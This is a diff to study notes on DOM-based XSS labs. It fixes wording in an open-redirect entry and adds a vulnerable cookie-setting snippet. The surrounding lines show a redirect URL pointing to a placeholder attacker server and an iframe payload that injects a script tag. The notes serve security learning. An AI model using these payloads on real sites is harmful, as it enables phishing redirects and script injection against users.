@@ -126,7 +126,7 @@ window.addEventListener('message', function(e) {
 
 ### DOM XSS - Open Redirection
 
-* There was a client-side script on the application that is taking in a query parameter called “url” and using the value in a location.href Sink.  The URL needs to begin with “https://”.  The JavaScript Pseudo-protocol will not work here in this case.  This will simply redirect a user to a different website, can be used for phishing.
+* There was a client-side script on the application that is taking in a query parameter called “url” and using the value in a location.href sink.  The URL needs to begin with “https://”.  The JavaScript Pseudo-protocol will not work here in this case.  This will simply redirect a user to a different website, can be used for phishing.
 
 ```
 https://VULNERABLE-APPLICATION.net/post?postId=4&url=https://ATTACKER-SERVER.web-security-academy.net/
@@ -155,3 +155,10 @@ https://VULNERABLE-APPLICATION.net/post?postId=4&url=https://ATTACKER-SERVER.web
 <iframe src="https://VULNERABLE-APP.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://VULNERABLE-APP.net';window.x=1;">
 ```
 
+* **Vulnerable Code:**
+
+```javascript
+<script>
+   document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
+</script>
+```
